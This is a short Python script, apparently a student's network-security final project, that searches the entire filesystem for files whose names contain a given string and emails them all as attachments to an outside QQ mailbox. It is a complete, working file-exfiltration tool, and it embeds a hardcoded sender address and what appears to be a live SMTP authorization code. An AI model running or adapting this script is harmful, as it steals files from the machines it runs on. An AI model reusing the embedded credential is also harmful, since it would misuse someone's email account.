#encoding=utf-8
import smtplib
from email.mime.text import MIMEText
from email.header import Header
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email import  encoders
import os
import string
file_path=[]
for root, dirs, files in os.walk(r"/"):
    try:
        for file in files:
            if file.find("luanzhiheng")>=0:
                file_path.append(os.path.join(root, file))
    except Exception:
        pass
    continue
msg_from = '2186231286@qq.com'  # 发送方邮箱
passwd = 'zptrusebacaeebei'  # 填入发送方邮箱的授权码(填入自己的授权码，相当于邮箱密码)
msg_to = ['813956323@qq.com']  # 收件人邮箱

subject = "网络安全期末大作业"  # 主题
# 创建一个带附件的实例
msg = MIMEMultipart()
# 放入邮件主题
msg['Subject'] = subject

# 放入发件人
msg['From'] = msg_from

# 邮件正文内容
msg.attach(MIMEText('接收邮件成功', 'plain', 'utf-8'))
def addAttach(apath, filename):
    with open(apath, 'rb') as fp:
        attach = MIMEBase('application', 'octet-stream')
        attach.set_payload(fp.read())
        attach.add_header('Content-Disposition', 'attachment', filename=filename)
        encoders.encode_base64(attach)
        fp.close()
        return attach
# 构造附件，传送列表中搜索到的文件
for path in file_path:
    filename=path.strip().split('/')[-1]
    attach=addAttach(path,filename)
    msg.attach(attach)

try:
    # 通过普通方式发送
    s = smtplib.SMTP("smtp.qq.com", 587)
    # 登录到邮箱
    s.ehlo()
    s.login(msg_from, passwd)
    # 发送邮件：发送方，收件方，要发送的消息
    s.sendmail(msg_from, msg_to, msg.as_string())
    print('成功')
except Exception as e:
    print(e)
finally:
    pass
